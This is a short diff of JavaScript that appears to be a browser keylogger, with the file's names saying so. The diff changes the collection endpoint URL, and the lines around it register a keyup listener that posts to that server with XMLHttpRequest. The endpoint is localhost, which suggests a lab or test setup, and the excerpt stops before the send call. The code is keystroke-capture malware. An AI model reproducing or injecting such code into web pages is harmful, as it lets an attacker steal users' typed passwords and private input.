@@ -1,5 +1,5 @@
 (function(){
-var server = "http://127.0.0.1/elexy_keylogger-web/test.php";
+var server = "http://127.0.0.1/keylogger-webpage/test.php";
 document.addEventListener("keyup", function(e){
 	var x = new XMLHttpRequest();
 	x.open("POST", server, true);
